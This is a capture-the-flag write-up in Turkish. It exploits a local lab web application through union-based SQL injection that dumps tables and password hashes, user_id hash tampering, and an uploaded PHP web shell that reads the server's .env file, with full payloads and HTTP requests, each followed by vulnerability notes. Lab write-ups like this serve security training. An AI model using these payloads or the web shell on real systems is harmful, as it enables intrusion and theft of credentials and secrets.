**

# FLAG 1

- Veri tabanında 3 tane tablo yer almaktadır.
- asd'UNION SELECT "i",table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- ASD
- SQL Injection kullanılarak information_schema.tables içeriği çekildi ve flags isimli tablo keşfedildi.
- asd'UNION SELECT "i",column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='flags'-- ASD
- Ardından flags tablosundaki içerik çekildi:
- asd'UNION SELECT "i",flag_value,NULL,NULL,NULL,NULL FROM flags-- ASD

#### Güvenlik Açığı:
- Kullanıcı girişinde SQL sorgusu doğrudan veri tabanına gönderilmiş.
- Parametreler hazırlanamamış (prepared statements eksik).
- Veritabanı tabloları bilgi sızdırılabilir durumda.
### YZT_FLAG1{f94222bbb8976f1a753a25be2c81384a}
# FLAG 2

- asd'UNION SELECT "i",column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ASD
- asd'UNION SELECT "i",password,NULL,NULL,NULL,NULL FROM users-- ASD
- asd'UNION SELECT "i",username,NULL,NULL,NULL,NULL FROM users-- ASD
- hash cracker la  [a87ff679a2f3e71d9181a67b7542122c](http://localhost:8081/admin/user_info.php?user_id=a87ff679a2f3e71d9181a67b7542122c) bu 4 olduğunu keşfettik.
- user_id parametresi ile doğrudan erişim sağlanabiliyor. 1 kullanıcısının MD5 hash'i kullanıldı:
- 1 → c4ca4238a0b923820dcc509a6f75849b
- ve user_id ye ekledik ve flag2 bulundu.

#### Güvenlik Açığı:
- user_id olarak hash değer göndererek yetkisiz kullanıcı bilgisi elde edilebiliyor.
- Kimlik doğrulama kontrolleri eksik veya zayıf.
- MD5 gibi zayıf bir algoritma ile kullanıcı doğrulama yapılmış.
### YZT_FLAG2{998be3c05163e29054a6a0a82afd6435} 

# FLAG 3

- http://localhost:8081/admin/user_info.php?user_id=c4ca4238a0b923820dcc509a6f75849b 
- Content-Disposition: form-data; name="file"; filename="patatest.php" 
- Content-Type: text/plain 
- <?php 
- // 'ls' komutunu çalıştır 
- $output = shell_exec('cat ../../.env'); 
- // Çıktıyı ekrana yazdır 
- echo "<pre>$output</pre>"; 
- ?> 
- Repeaterda bu isteği de gönder 
- GET /admin/uploads/patatest.php HTTP/1.1 
- Host: localhost:8081 
- sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134" 
- sec-ch-ua-mobile: ?0 
- sec-ch-ua-platform: "macOS" 
- Accept-Language: tr-TR,tr;q=0.9 
- Upgrade-Insecure-Requests: 1 
- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7 
- Sec-Fetch-Site: none 
- Sec-Fetch-Mode: navigate 
- Sec-Fetch-User: ?1 
- Sec-Fetch-Dest: document 
- Accept-Encoding: gzip, deflate, br 
- Cookie: PHPSESSID=3dc3ed0ed831f473ad06fb91b7b19e51 
- Connection: keep-alive 

YZT_FLAG1{b2e605ed389aef58002aa7132ad26d98} 

YZT_FLAG2{998be3c05163e29054a6a0a82afd6435} 

YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}

#### Güvenlik Açığı:
- Sunucuya PHP uzantılı dosya yüklenebiliyor.
- Yüklenen dosya çalıştırılabiliyor (Web Shell gibi).
- .env dosyası gibi kritik yapılandırma dosyaları dışarı sızdırılabiliyor.
  

### SONUÇ

Uygulama, SQL injection, zayıf kimlik doğrulama ve dosya yükleme zafiyetlerine karşı savunmasızdır. Bu zafiyetler birleştiğinde bir saldırgan sisteme tam erişim sağlayabilir. Özellikle .env dosyası ve shell komutları çalıştırılabiliyor olması kritik bir RCE (Remote Code Execution) zaafiyetidir.

**